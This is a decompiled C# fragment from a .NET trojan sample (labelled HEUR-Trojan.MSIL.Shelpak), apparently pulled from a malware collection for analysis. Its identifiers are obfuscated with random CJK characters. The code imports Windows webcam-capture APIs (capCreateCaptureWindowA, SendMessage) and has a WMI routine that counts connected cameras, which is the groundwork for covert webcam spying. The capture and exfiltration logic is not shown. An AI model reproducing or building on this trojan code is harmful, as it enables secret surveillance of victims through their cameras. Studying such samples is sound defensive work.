// Decompiled with JetBrains decompiler
// Type: 見匚阜子攴方土石舛夂革心又.斗大工廴氏手丨鹿又毋
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Management;
using System.Runtime.InteropServices;

namespace 見匚阜子攴方土石舛夂革心又
{
  internal sealed class 斗大工廴氏手丨鹿又毋
  {
    private static IntPtr 艮韭矛冖无卩戶匕毋巾丿子;
    private static int 龠刀心方巾鳥斗又舟虍卩 = 3000;

    [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
    public static extern IntPtr 巾匕革齊鼠氏牛手爻鬲曰矢(
      string 匸工夊巾鬯毛彳寸缶斗糸,
      int 見亅氏皿无亠彡冫臼而黍米鬯,
      int 龍毋匸瓜工斤牛日彳尢里黍,
      int 爻入大皮艮火文尸宀走龜犬攴,
      int 黑酉立儿龠牛鼻火見己尢比欠禸,
      int 至衣夊酉耳十見卜金龍生欠冫歹,
      int 氏鼓止戈日子几十爿女,
      int 攴豸牙十目豸尸阜彡入皮片);

    [DllImport("user32", EntryPoint = "SendMessage")]
    public static extern int 辛干勹龜爪廴彡戶彡士龍(
      IntPtr 甘立斗广火黽彐宀大赤勹弋,
      uint 曰尸爪自阜气屮十糸木止曰,
      int 鬯儿鹿厶曰力面父爿凵匸卜自刀,
      int 亠子爻宀立气鹵飛匸牛冫尢);

    private static int 幺攴鹵缶立匕阜土彡水片凵广示()
    {
      int num = 0;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
        {
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
            ++num;
        }
      }
      catch
      {
        Console.WriteLine("GetConnectedCamerasCount : Query failed");
      }
      return num;
    }
  }
}
